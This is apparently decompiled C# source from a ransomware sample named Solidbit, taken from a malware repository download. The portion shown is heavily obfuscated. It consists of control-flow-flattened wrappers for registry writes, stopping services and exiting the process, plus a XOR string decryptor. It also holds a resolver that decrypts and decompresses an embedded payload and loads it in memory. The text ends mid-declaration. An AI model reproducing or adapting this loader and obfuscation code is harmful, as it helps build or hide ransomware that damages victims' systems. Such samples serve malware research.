// Decompiled with JetBrains decompiler
// Type: Ⴐ.Ⴅ
// Assembly: Solidbit, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 585D2EC3-B651-45BA-BA8B-E0885A5222B8
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.06\HEUR-Trojan-Ransom.MSIL.Encoder.gen-0f73ddb9dba894298b468d162f7dd49ae6f49cdc71184b98339d5b1e3eccbb02.exe

using Microsoft.Win32;
using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.ComponentModel;
using System.Configuration;
using System.Diagnostics;
using System.Drawing;
using System.Globalization;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.Policy;
using System.ServiceProcess;
using System.Text;
using System.Windows.Forms;

namespace Ⴐ
{
  [GeneratedCode("System.Resources.Tools.StronglyTypedResourceBuilder", "4.0.0.0")]
  internal sealed class Ⴅ
  {
    private static ResourceManager Ⴗ;
    private static CultureInfo Ⴐ;
    private static readonly char[] ႷႣ;
    private static readonly char[] ႷႥ = new char[8]
    {
      char.MinValue,
      '\u0005',
      char.MinValue,
      '\u09FC',
      '\u08D7',
      '\u2EF7',
      '♉',
      '\u008C'
    };
    private static readonly string[] ႷႷ;
    internal static Ⴐ.Ⴅ.ႷႭ ႷႤ;

    internal Ⴅ()
    {
    }

    [EditorBrowsable(EditorBrowsableState.Advanced)]
    internal static ResourceManager Ⴐ
    {
      get
      {
label_3:
        bool flag = !Ⴐ.Ⴈ.Ⴗ((object) Ⴐ.Ⴅ.Ⴗ, (object) null, 297, 322);
        int num = 5;
        ResourceManager resourceManager;
        while (true)
        {
          switch (num)
          {
            case 0:
            case 1:
              goto label_3;
            case 2:
            case 6:
            case 7:
              resourceManager = new ResourceManager("Ⴐ.Ⴅ", Ⴐ.Ⴅ.Ⴓ.Ⴃ(Ⴐ.Ⴈ.Ⴀ.Ⴀ(__typeref (Ⴐ.Ⴅ), 447, 500), 430, 413));
              num = 3;
              continue;
            case 3:
              Ⴐ.Ⴅ.Ⴗ = resourceManager;
              num = 8;
              continue;
            case 5:
              num = flag ? 8 : 7;
              continue;
            case 8:
              goto label_7;
            default:
              RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴐ.Ⴅ.Ⴐ);
              num = 1;
              continue;
          }
        }
label_7:
        return Ⴐ.Ⴅ.Ⴗ;
      }
    }

    [EditorBrowsable(EditorBrowsableState.Advanced)]
    internal static CultureInfo Ⴃ
    {
      get => Ⴐ.Ⴅ.Ⴐ;
      set => Ⴐ.Ⴅ.Ⴐ = value;
    }

    [SpecialName]
    internal static Bitmap Ⴈ()
    {
label_3:
      object obj = Ⴐ.Ⴅ.Ⴓ.Ⴄ(Ⴐ.Ⴅ.Ⴐ, Ⴐ.Ⴈ.Ⴍ(1409402075, 1), Ⴐ.Ⴅ.Ⴐ, 380, 382);
      int num = 5;
      while (true)
      {
        switch (num)
        {
          case 0:
          case 2:
            goto label_3;
          case 5:
            goto label_4;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴐ.Ⴅ.Ⴈ);
            num = 2;
            continue;
        }
      }
label_4:
      return (Bitmap) obj;
    }

    [SpecialName]
    internal static Bitmap Ⴅ()
    {
label_3:
      object obj = Ⴐ.Ⴅ.Ⴓ.Ⴄ(Ⴐ.Ⴅ.Ⴐ, Ⴐ.Ⴈ.Ⴍ(1409402058, 1), Ⴐ.Ⴅ.Ⴐ, 609, 611);
      int num = 3;
      while (true)
      {
        switch (num)
        {
          case 0:
            goto label_5;
          case 1:
          case 4:
            goto label_3;
          case 3:
            goto label_4;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴐ.Ⴅ.Ⴅ);
            num = 4;
            continue;
        }
      }
label_4:
      Bitmap bitmap = (Bitmap) obj;
label_5:
      return bitmap;
    }

    [SpecialName]
    internal static Bitmap Ⴀ()
    {
label_3:
      object obj = Ⴐ.Ⴅ.Ⴓ.Ⴄ(Ⴐ.Ⴅ.Ⴐ, Ⴐ.Ⴈ.Ⴍ(1409402108, 5), Ⴐ.Ⴅ.Ⴐ, 6, 4);
label_4:
      int num = 3;
      while (true)
      {
        switch (num)
        {
          case 1:
          case 3:
            goto label_5;
          case 4:
            goto label_4;
          case 5:
            goto label_3;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴐ.Ⴅ.Ⴀ);
            num = 5;
            continue;
        }
      }
label_5:
      return (Bitmap) obj;
    }

    [SecuritySafeCritical]
    static Ⴅ()
    {
      char[] chArray = new char[8]
      {
        char.MinValue,
        char.MinValue,
        char.MinValue,
        char.MinValue,
        'Î',
        '\u1CB4',
        char.MinValue,
        char.MinValue
      };
      chArray[2] = '⻆';
      chArray[3] = '♰';
      chArray[7] = 'ഌ';
      chArray[1] = '\u08E2';
      chArray[6] = 'ႌ';
      chArray[0] = '\u09D1';
      Ⴐ.Ⴅ.ႷႷ = new string[1];
      Ⴐ.Ⴅ.ႷႣ = chArray;
      Ⴐ.Ⴅ.Ⴓ.ႤႠ();
    }

    [SecuritySafeCritical]
    internal static object Ⴜ([In] SettingsBase obj0, [In] string obj1, [In] int obj2, [In] int obj3)
    {
label_3:
      int num1;
      switch (obj3 ^ obj2)
      {
        case 101:
          num1 = 0;
          break;
        default:
          num1 = 3;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 4:
            goto label_8;
          case 1:
          case 3:
          case 5:
            num2 = 2;
            continue;
          case 2:
            goto label_3;
          case 7:
            num2 = 2;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴐ.Ⴅ.Ⴜ);
            num2 = 2;
            continue;
        }
      }
label_8:
      return obj0[obj1];
    }

    [SecuritySafeCritical]
    internal static bool ႥႣ([In] string obj0, [In] int obj1, [In] int obj2)
    {
label_3:
      int num1;
      switch (obj2 ^ obj1)
      {
        case 114:
          num1 = 5;
          break;
        default:
          num1 = 1;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 7:
            goto label_3;
          case 1:
            num2 = 7;
            continue;
          case 2:
          case 3:
          case 6:
            num2 = 7;
            continue;
          case 5:
            goto label_8;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴐ.Ⴅ.ႥႣ);
            num2 = 7;
            continue;
        }
      }
label_8:
      return File.Exists(obj0);
    }

    [SecuritySafeCritical]
    internal static void ႥႥ([In] int obj0, [In] int obj1, [In] int obj2)
    {
      int num1 = 1;
      while (true)
      {
        switch (num1)
        {
          case 0:
          case 2:
          case 4:
            goto label_7;
          case 3:
          case 5:
            num1 = 1;
            continue;
          default:
            int num2;
            switch ((obj2 ^ obj1) - 0)
            {
              case 0:
                num2 = 4;
                break;
              default:
                num2 = 3;
                break;
            }
            num1 = num2;
            continue;
        }
      }
label_7:
      Environment.Exit(obj0);
    }

    [SecuritySafeCritical]
    internal static StringBuilder ႥႷ(
      [In] StringBuilder obj0,
      [In] string obj1,
      [In] int obj2,
      [In] int obj3)
    {
label_3:
      int num1;
      switch (obj3 ^ obj2)
      {
        case 123:
          num1 = 0;
          break;
        default:
          num1 = 7;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 2:
            goto label_8;
          case 1:
          case 3:
            num2 = 4;
            continue;
          case 4:
            goto label_3;
          case 7:
            num2 = 4;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴐ.Ⴅ.ႥႷ);
            num2 = 4;
            continue;
        }
      }
label_8:
      return obj0.AppendLine(obj1);
    }

    [SecuritySafeCritical]
    internal static string ႥႭ([In] string obj0, [In] string obj1, [In] int obj2, [In] int obj3)
    {
label_3:
      int num1;
      switch (obj3 ^ obj2)
      {
        case 42:
          num1 = 2;
          break;
        default:
          num1 = 1;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 1:
          case 7:
            num2 = 4;
            continue;
          case 2:
            goto label_8;
          case 3:
          case 4:
            goto label_3;
          case 5:
            num2 = 4;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴐ.Ⴅ.ႥႭ);
            num2 = 4;
            continue;
        }
      }
label_8:
      return obj0 + obj1;
    }

    [SecuritySafeCritical]
    internal static void ႥႤ([In] ProcessStartInfo obj0, [In] ProcessWindowStyle obj1, [In] int obj2, [In] int obj3)
    {
      int num1 = 1;
      while (true)
      {
        switch (num1)
        {
          case 0:
            goto label_8;
          case 2:
          case 4:
            num1 = 1;
            continue;
          case 3:
          case 5:
            goto label_7;
          default:
            int num2;
            switch (obj3 ^ obj2)
            {
              case 126:
                num2 = 5;
                break;
              default:
                num2 = 2;
                break;
            }
            num1 = num2;
            continue;
        }
      }
label_8:
      return;
label_7:
      obj0.WindowStyle = obj1;
    }

    [SecuritySafeCritical]
    internal static void ႥႨ([In] RegistryKey obj0, [In] string obj1, [In] object obj2, [In] int obj3, [In] int obj4)
    {
      int num1 = 1;
      while (true)
      {
        switch (num1)
        {
          case 0:
          case 4:
            goto label_7;
          case 2:
          case 3:
            num1 = 1;
            continue;
          default:
            int num2;
            switch (obj4 ^ obj3)
            {
              case 72:
                num2 = 4;
                break;
              default:
                num2 = 2;
                break;
            }
            num1 = num2;
            continue;
        }
      }
label_7:
      obj0.SetValue(obj1, obj2);
    }

    [SecuritySafeCritical]
    internal static void ႥႰ([In] Panel obj0, [In] BorderStyle obj1, [In] int obj2, [In] int obj3)
    {
      int num1 = 0;
      while (true)
      {
        switch (num1)
        {
          case 1:
          case 2:
          case 4:
            goto label_7;
          case 3:
          case 5:
            num1 = 0;
            continue;
          default:
            int num2;
            switch (obj3 ^ obj2)
            {
              case 124:
                num2 = 2;
                break;
              default:
                num2 = 3;
                break;
            }
            num1 = num2;
            continue;
        }
      }
label_7:
      obj0.BorderStyle = obj1;
    }

    [SecuritySafeCritical]
    internal static void ႥႳ([In] Label obj0, [In] ContentAlignment obj1, [In] int obj2, [In] int obj3)
    {
      int num1 = 2;
      while (true)
      {
        switch (num1)
        {
          case 0:
            goto label_7;
          case 1:
          case 4:
            num1 = 2;
            continue;
          default:
            int num2;
            switch (obj3 ^ obj2)
            {
              case 19:
                num2 = 0;
                break;
              default:
                num2 = 4;
                break;
            }
            num1 = num2;
            continue;
        }
      }
label_7:
      obj0.TextAlign = obj1;
    }

    [SecuritySafeCritical]
    internal static string ႥႠ([In] ResourceManager obj0, [In] string obj1, [In] int obj2, [In] int obj3)
    {
label_3:
      int num1;
      switch (obj3 ^ obj2)
      {
        case 7:
          num1 = 7;
          break;
        default:
          num1 = 5;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
            goto label_3;
          case 2:
          case 7:
            goto label_8;
          case 4:
          case 6:
            num2 = 0;
            continue;
          case 5:
            num2 = 0;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴐ.Ⴅ.ႥႠ);
            num2 = 0;
            continue;
        }
      }
label_8:
      return obj0.GetString(obj1);
    }

    internal static string ႥႼ([In] int obj0, [In] int obj1)
    {
      int index1 = obj0 ^ 1409402074 ^ obj1;
      char[] ⴗⴅ = Ⴐ.Ⴅ.ႷႥ;
      int index2 = (int) ⴗⴅ[index1];
      string str1;
      if ((str1 = Ⴐ.Ⴅ.ႷႷ[index2]) != null)
        return str1;
      int num1 = (int) ⴗⴅ[index1 + 1];
      int length1 = ((int) ⴗⴅ[index1 + 2] << 16) + num1;
      char[] chArray = new char[length1];
      char[] ⴗⴃ = Ⴐ.Ⴅ.ႷႣ;
      int length2 = ⴗⴃ.Length;
      int num2 = index1 + 3;
      for (int index3 = 0; index3 < length1; index3 = 1 + index3)
        chArray[index3] = (char) ((uint) ⴗⴅ[num2 + index3] ^ (uint) ⴗⴃ[(index3 + index2) % length2]);
      string str2 = new string(chArray);
      Ⴐ.Ⴅ.ႷႷ[index2] = str2;
      return str2;
    }

    [SecuritySafeCritical]
    internal static bool ႷႨ([In] Assembly obj0, [In] Assembly obj1, [In] int obj2, [In] int obj3)
    {
label_0:
      switch ((obj3 ^ obj2) - 48)
      {
        case 0:
          return obj0 != obj1;
        default:
          goto label_0;
      }
    }

    [SecuritySafeCritical]
    internal static void ႷႰ([In] Stream obj0, [In] byte[] obj1, [In] int obj2, [In] int obj3, [In] int obj4, [In] int obj5)
    {
label_0:
      switch ((obj5 ^ obj4) - 49)
      {
        case 0:
          obj0.Write(obj1, obj2, obj3);
          break;
        default:
          goto label_0;
      }
    }

    [SecuritySafeCritical]
    internal static int ႷႳ([In] Stream obj0, [In] byte[] obj1, [In] int obj2, [In] int obj3, [In] int obj4, [In] int obj5)
    {
label_0:
      switch ((obj5 ^ obj4) - 79)
      {
        case 0:
          return obj0.Read(obj1, obj2, obj3);
        default:
          goto label_0;
      }
    }

    internal sealed class Ⴄ
    {
      internal static Ⴐ.Ⴅ.Ⴄ.Ⴗ Ⴈ;

      internal static Assembly Ⴅ([In] object obj0, [In] ResolveEventArgs obj1) => Ⴐ.Ⴅ.Ⴄ.Ⴓ(obj1, __fieldref (Ⴐ.Ⴅ.Ⴄ.Ⴈ), 75985, "8eea2cf8-644c-40a8-8405-7afe99e93222", 141);

      internal static Assembly Ⴓ(
        ResolveEventArgs args,
        RuntimeFieldHandle resourceField,
        int resourceLength,
        string nameGuid,
        int offset)
      {
label_3:
        while (resourceLength > 0)
        {
          int num1 = 0;
          Assembly assembly;
          string name;
          AppDomain appDomain;
          Dictionary<string, string> dictionary;
          byte[] buffer;
          int index1;
          while (true)
          {
            switch (num1)
            {
              case 0:
                assembly = Ⴐ.Ⴅ.Ⴄ.ႥႷ(152, 146);
                num1 = !Ⴐ.Ⴅ.ႷႨ(Ⴐ.Ⴅ.Ⴄ.ႥႨ(args, 506, 388), assembly, 779, 827) ? 6 : 12;
                continue;
              case 1:
                goto label_3;
              case 2:
              case 11:
                ++index1;
                num1 = 4;
                continue;
              case 3:
                Ⴐ.Ⴅ.Ⴄ.ႥႣ((Array) buffer, resourceField, 876, 832);
                index1 = 0;
                num1 = 4;
                continue;
              case 4:
                num1 = index1 < resourceLength ? 5 : 7;
                continue;
              case 5:
                buffer[index1] ^= (byte) (index1 + offset & (int) byte.MaxValue);
                num1 = 2;
                continue;
              case 6:
                name = Ⴐ.Ⴅ.Ⴄ.ႥႥ(nameGuid, Ⴐ.Ⴅ.ႥႼ(1409402076, 6), 336, 354);
                goto case 14;
              case 7:
                goto label_17;
              case 8:
              case 13:
                appDomain = Ⴐ.Ⴈ.Ⴀ.ႳႠ(564, 594);
                dictionary = (Dictionary<string, string>) Ⴐ.Ⴅ.Ⴄ.ႥႳ(appDomain, nameGuid, 713, 695);
                num1 = 15;
                continue;
              case 10:
                dictionary = new Dictionary<string, string>();
                Ⴐ.Ⴅ.Ⴄ.ႥႠ(appDomain, nameGuid, (object) dictionary, 694, 672);
                buffer = new byte[resourceLength];
                num1 = 3;
                continue;
              case 12:
                goto label_6;
              case 14:
                num1 = 8;
                continue;
              case 15:
                if (dictionary == null)
                {
                  num1 = 10;
                  continue;
                }
                goto label_37;
              default:
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴐ.Ⴅ.Ⴄ.Ⴓ);
                num1 = 1;
                continue;
            }
          }
label_6:
          return (Assembly) null;
label_17:
          MemoryStream memoryStream = new MemoryStream();
          DeflateStream deflateStream = new DeflateStream((Stream) new MemoryStream(buffer), CompressionMode.Decompress, true);
          try
          {
            int num2 = 2;
            byte[] numArray;
            int num3;
            while (true)
            {
              switch (num2)
              {
                case 0:
                  Ⴐ.Ⴅ.ႷႰ((Stream) memoryStream, numArray, 0, num3, 590, 639);
                  goto case 6;
                case 1:
                  goto label_29;
                case 4:
                case 5:
                  num2 = 7;
                  continue;
                case 6:
                case 7:
                  num2 = (num3 = Ⴐ.Ⴅ.ႷႳ((Stream) deflateStream, numArray, 0, numArray.Length, 635, 564)) > 0 ? 0 : 1;
                  continue;
                default:
                  numArray = new byte[1024];
                  goto case 4;
              }
            }
          }
          finally
          {
            int num4 = 5;
            while (true)
            {
              switch (num4)
              {
                case 1:
                  goto label_28;
                case 3:
                  goto label_27;
                default:
                  num4 = deflateStream == null ? 1 : 3;
                  continue;
              }
            }
label_27:
            deflateStream.Dispose();
label_28:;
          }
label_29:
          int num5 = 7;
label_30:
          Assembly data;
          string[] manifestResourceNames;
          int index2;
          string key;
          while (true)
          {
            switch (num5)
            {
              case 0:
              case 1:
                appDomain.SetData(name, (object) data);
                manifestResourceNames = data.GetManifestResourceNames();
                index2 = 0;
                num5 = 8;
                continue;
              case 2:
                num5 = 6;
                continue;
              case 3:
                goto label_39;
              case 4:
                goto label_40;
              case 5:
              case 9:
                key = manifestResourceNames[index2];
                goto case 12;
              case 6:
                num5 = !dictionary.ContainsKey(args.Name) ? 4 : 3;
                continue;
              case 8:
                num5 = index2 < manifestResourceNames.Length ? 9 : 2;
                continue;
              case 11:
                goto label_37;
              case 12:
                dictionary[key] = key;
                ++index2;
                num5 = 8;
                continue;
              default:
                data = Ⴐ.Ⴅ.Ⴄ.ႥႰ(Ⴐ.Ⴈ.ႣႠ(memoryStream, 763, 766), (byte[]) null, Ⴐ.Ⴈ.ႣႰ(assembly, 829, 865), 770, 831);
                num5 = 1;
                continue;
            }
          }
label_39:
          return data;
label_37:
          data = (Assembly) appDomain.GetData(name);
          num5 = 6;
          goto label_30;
        }
label_40:
        return (Assembly) null;
      }

      [SecuritySafeCritical]
      internal static FileAttributes Ⴀ([In] FileSystemInfo obj0, [In] int obj1, [In] int obj2)
      {
label_3:
        int num1;
        switch (obj2 ^ obj1)
        {
          case 104:
            num1 = 2;
            break;
          default:
            num1 = 5;
            break;
        }
        int num2 = num1;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 1:
              goto label_3;
            case 2:
            case 6:
            case 7:
              goto label_8;
            case 4:
              num2 = 1;
              continue;
            case 5:
              num2 = 1;
              continue;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴐ.Ⴅ.Ⴄ.Ⴀ);
              num2 = 1;
              continue;
          }
        }
label_8:
        return obj0.Attributes;
      }

      [SecuritySafeCritical]
      internal static void Ⴃ([In] Control obj0, [In] int obj1, [In] int obj2)
      {
        int num1 = 1;
        while (true)
        {
          switch (num1)
          {
            case 3:
            case 4:
              goto label_7;
            case 5:
              num1 = 1;
              continue;
            default:
              int num2;
              switch (obj2 ^ obj1)
              {
                case 50:
                  num2 = 4;
                  break;
                case 51:
                  goto label_8;
                case 52:
                  goto label_9;
                default:
                  num2 = 5;
                  break;
              }
              num1 = num2;
              continue;
          }
        }
label_7:
        obj0.Show();
        return;
label_8:
        obj0.SuspendLayout();
        return;
label_9:
        obj0.SuspendLayout();
      }

      [SecuritySafeCritical]
      internal static int Ⴐ([In] Random obj0, [In] int obj1, [In] int obj2, [In] int obj3)
      {
label_3:
        int num1;
        switch (obj3 ^ obj2)
        {
          case 101:
            num1 = 0;
            break;
          default:
            num1 = 2;
            break;
        }
        int num2 = num1;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 1:
            case 4:
              goto label_8;
            case 2:
              num2 = 3;
              continue;
            case 3:
              goto label_3;
            case 5:
            case 6:
              num2 = 3;
              continue;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴐ.Ⴅ.Ⴄ.Ⴐ);
              num2 = 3;
              continue;
          }
        }
label_8:
        return obj0.Next(obj1);
      }

      [SecuritySafeCritical]
      internal static Encoding Ⴍ([In] int obj0, [In] int obj1)
      {
label_3:
        int num1;
        switch (obj1 ^ obj0)
        {
          case 31:
            num1 = 4;
            break;
          default:
            num1 = 7;
            break;
        }
        int num2 = num1;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 7:
              num2 = 6;
              continue;
            case 1:
              num2 = 6;
              continue;
            case 4:
              goto label_8;
            case 6:
              goto label_3;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴐ.Ⴅ.Ⴄ.Ⴍ);
              num2 = 6;
              continue;
          }
        }
label_8:
        return Encoding.UTF8;
      }

      [SecuritySafeCritical]
      internal static void Ⴄ(
        [In] Array obj0,
        [In] int obj1,
        [In] Array obj2,
        [In] int obj3,
        [In] int obj4,
        [In] int obj5,
        [In] int obj6)
      {
        int num1 = 2;
        while (true)
        {
          switch (num1)
          {
            case 0:
            case 1:
            case 4:
              goto label_7;
            case 3:
            case 5:
              num1 = 2;
              continue;
            default:
              int num2;
              switch (obj6 ^ obj5)
              {
                case 68:
                  num2 = 0;
                  break;
                default:
                  num2 = 5;
                  break;
              }
              num1 = num2;
              continue;
          }
        }
label_7:
        Array.Copy(obj0, obj1, obj2, obj3, obj4);
      }

      [SecuritySafeCritical]
      internal static void Ⴜ([In] Stream obj0, [In] Stream obj1, [In] int obj2, [In] int obj3)
      {
        int num1 = 0;
        while (true)
        {
          switch (num1)
          {
            case 1:
            case 2:
              goto label_7;
            case 4:
            case 5:
              num1 = 0;
              continue;
            default:
              int num2;
              switch (obj3 ^ obj2)
              {
                case 104:
                  num2 = 2;
                  break;
                default:
                  num2 = 4;
                  break;
              }
              num1 = num2;
              continue;
          }
        }
label_7:
        obj0.CopyTo(obj1);
      }

      [SecuritySafeCritical]
      internal static string ႨႷ([In] object obj0, [In] int obj1, [In] int obj2)
      {
label_3:
        int num1;
        switch (obj2 ^ obj1)
        {
          case 85:
            num1 = 3;
            break;
          default:
            num1 = 0;
            break;
        }
        int num2 = num1;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 2:
              num2 = 7;
              continue;
            case 3:
            case 6:
              goto label_8;
            case 4:
            case 5:
              num2 = 7;
              continue;
            case 7:
              goto label_3;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴐ.Ⴅ.Ⴄ.ႨႷ);
              num2 = 7;
              continue;
          }
        }
label_8:
        return obj0.ToString();
      }

      [SecuritySafeCritical]
      internal static void ႨႨ([In] ServiceController obj0, [In] int obj1, [In] int obj2)
      {
        int num1 = 3;
        while (true)
        {
          switch (num1)
          {
            case 0:
            case 2:
              num1 = 3;
              continue;
            case 1:
              goto label_7;
            case 4:
              goto label_8;
            default:
              int num2;
              switch (obj2 ^ obj1)
              {
                case 93:
                  num2 = 1;
                  break;
                default:
                  num2 = 0;
                  break;
              }
              num1 = num2;
              continue;
          }
        }
label_8:
        return;
label_7:
        obj0.Stop();
      }

      [SecuritySafeCritical]
      internal static string ႨႥ([In] AppDomain obj0, [In] int obj1, [In] int obj2)
      {
label_3:
        int num1;
        switch (obj2 ^ obj1)
        {
          case 81:
            num1 = 4;
            break;
          default:
            num1 = 3;
            break;
        }
        int num2 = num1;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 1:
            case 2:
            case 4:
              goto label_8;
            case 3:
              num2 = 7;
              continue;
            case 6:
              num2 = 7;
              continue;
            case 7:
              goto label_3;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴐ.Ⴅ.Ⴄ.ႨႥ);
              num2 = 7;
              continue;
          }
        }
label_8:
        return obj0.FriendlyName;
      }

      [SecuritySafeCritical]
      internal static void ႨႳ(
        [In] RegistryKey obj0,
        [In] string obj1,
        [In] object obj2,
        [In] RegistryValueKind obj3,
        [In] int obj4,
        [In] int obj5)
      {
        int num1 = 3;
        while (true)
        {
          switch (num1)
          {
            case 0:
              goto label_8;
            case 2:
            case 5:
              goto label_7;
            case 4:
              num1 = 3;
              continue;
            default:
              int num2;
              switch (obj5 ^ obj4)
              {
                case 44:
                  num2 = 5;
                  break;
                default:
                  num2 = 4;
                  break;
              }
              num1 = num2;
              continue;
          }
        }
label_8:
        return;
label_7:
        obj0.SetValue(obj1, obj2, obj3);
      }

      [SecuritySafeCritical]
      internal static void ႨႠ([In] Control obj0, [In] System.Drawing.Color obj1, [In] int obj2, [In] int obj3)
      {
        int num1 = 4;
        while (true)
        {
          switch (num1)
          {
            case 0:
            case 1:
            case 3:
              goto label_7;
            case 2:
              num1 = 4;
              continue;
            case 5:
              goto label_9;
            default:
              int num2;
              switch (obj3 ^ obj2)
              {
                case 48:
                  num2 = 0;
                  break;
                case 49:
                  goto label_8;
                default:
                  num2 = 2;
                  break;
              }
              num1 = num2;
              continue;
          }
        }
label_9:
        return;
label_7:
        obj0.BackColor = obj1;
        return;
label_8:
        obj0.ForeColor = obj1;
      }

      [SecuritySafeCritical]
      internal static void ႨႣ([In] Control obj0, [In] Size obj1, [In] int obj2, [In] int obj3)
      {
        int num1 = 5;
        while (true)
        {
          switch (num1)
          {
            case 0:
            case 1:
            case 2:
              num1 = 5;
              continue;
            case 3:
              goto label_8;
            case 4:
              goto label_7;
            default:
              int num2;
              switch (obj3 ^ obj2)
              {
                case 124:
                  num2 = 4;
                  break;
                default:
                  num2 = 2;
                  break;
              }
              num1 = num2;
              continue;
          }
        }
label_8:
        return;
label_7:
        obj0.Size = obj1;
      }

      [SecuritySafeCritical]
      internal static void ႨႰ([In] Control obj0, [In] int obj1, [In] int obj2, [In] int obj3)
      {
        int num1 = 5;
        while (true)
        {
          switch (num1)
          {
            case 0:
            case 2:
            case 3:
            case 4:
              goto label_7;
            case 1:
              num1 = 5;
              continue;
            default:
              int num2;
              switch (obj3 ^ obj2)
              {
                case 110:
                  num2 = 3;
                  break;
                default:
                  num2 = 1;
                  break;
              }
              num1 = num2;
              continue;
          }
        }
label_7:
        obj0.TabIndex = obj1;
      }

      [SecuritySafeCritical]
      internal static void ႨႭ([In] Control obj0, [In] bool obj1, [In] int obj2, [In] int obj3)
      {
        int num1 = 0;
        while (true)
        {
          switch (num1)
          {
            case 1:
              num1 = 0;
              continue;
            case 3:
              goto label_8;
            case 4:
              goto label_7;
            case 5:
              goto label_9;
            default:
              int num2;
              switch (obj3 ^ obj2)
              {
                case 11:
                  num2 = 4;
                  break;
                default:
                  num2 = 1;
                  break;
              }
              num1 = num2;
              continue;
          }
        }
label_8:
        return;
label_9:
        return;
label_7:
        obj0.AutoSize = obj1;
      }

      [SecuritySafeCritical]
      internal static void ႨႤ([In] PictureBox obj0, [In] Image obj1, [In] int obj2, [In] int obj3)
      {
        int num1 = 3;
        while (true)
        {
          switch (num1)
          {
            case 0:
            case 4:
              goto label_7;
            case 1:
              num1 = 3;
              continue;
            case 2:
              goto label_8;
            default:
              int num2;
              switch (obj3 ^ obj2)
              {
                case 69:
                  num2 = 0;
                  break;
                default:
                  num2 = 1;
                  break;
              }
              num1 = num2;
              continue;
          }
        }
label_8:
        return;
label_7:
        obj0.Image = obj1;
      }

      [SecuritySafeCritical]
      internal static void ႨႼ([In] LinkLabel obj0, [In] bool obj1, [In] int obj2, [In] int obj3)
      {
        int num1 = 5;
        while (true)
        {
          switch (num1)
          {
            case 1:
            case 2:
            case 4:
              goto label_7;
            case 3:
              num1 = 5;
              continue;
            default:
              int num2;
              switch (obj3 ^ obj2)
              {
                case 117:
                  num2 = 2;
                  break;
                default:
                  num2 = 3;
                  break;
              }
              num1 = num2;
              continue;
          }
        }
label_7:
        obj0.TabStop = obj1;
      }

      [SecuritySafeCritical]
      internal static Assembly ႥႷ([In] int obj0, [In] int obj1)
      {
label_0:
        switch ((obj1 ^ obj0) - 10)
        {
          case 0:
            return Assembly.GetExecutingAssembly();
          default:
            goto label_0;
        }
      }

      [SecuritySafeCritical]
      internal static Assembly ႥႨ([In] ResolveEventArgs obj0, [In] int obj1, [In] int obj2)
      {
label_0:
        switch ((obj2 ^ obj1) - 126)
        {
          case 0:
            return obj0.RequestingAssembly;
          default:
            goto label_0;
        }
      }

      [SecuritySafeCritical]
      internal static string ႥႥ([In] string obj0, [In] string obj1, [In] int obj2, [In] int obj3)
      {
label_0:
        switch ((obj3 ^ obj2) - 50)
        {
          case 0:
            return obj0 + obj1;
          default:
            goto label_0;
        }
      }

      [SecuritySafeCritical]
      internal static object ႥႳ([In] AppDomain obj0, [In] string obj1, [In] int obj2, [In] int obj3)
      {
label_0:
        switch ((obj3 ^ obj2) - 126)
        {
          case 0:
            return obj0.GetData(obj1);
          default:
            goto label_0;
        }
      }

      [SecuritySafeCritical]
      internal static void ႥႠ([In] AppDomain obj0, [In] string obj1, [In] object obj2, [In] int obj3, [In] int obj4)
      {
label_0:
        switch ((obj4 ^ obj3) - 22)
        {
          case 0:
            obj0.SetData(obj1, obj2);
            break;
          default:
            goto label_0;
        }
      }

      [SecuritySafeCritical]
      internal static void ႥႣ([In] Array obj0, [In] RuntimeFieldHandle obj1, [In] int obj2, [In] int obj3)
      {
label_0:
        switch ((obj3 ^ obj2) - 44)
        {
          case 0:
            RuntimeHelpers.InitializeArray(obj0, obj1);
            break;
          default:
            goto label_0;
        }
      }

      [SecuritySafeCritical]
      internal static Assembly ႥႰ(
        [In] byte[] obj0,
        [In] byte[] obj1,
        [In] Evidence obj2,
        [In] int obj3,
        [In] int obj4)
      {
label_0:
        switch ((obj4 ^ obj3) - 61)
        {
          case 0:
            return Assembly.Load(obj0, obj1, obj2);
          default:
            goto label_0;
        }
      }

      [StructLayout(LayoutKind.Explicit, Size = 75985, Pack = 1)]
      private struct Ⴗ
      {
      }
    }

    internal sealed class Ⴓ
    {
      private static bool ႤႥ;

      [SecuritySafeCritical]
      internal static Assembly Ⴃ([In] System.Type obj0, [In] int obj1, [In] int obj2)
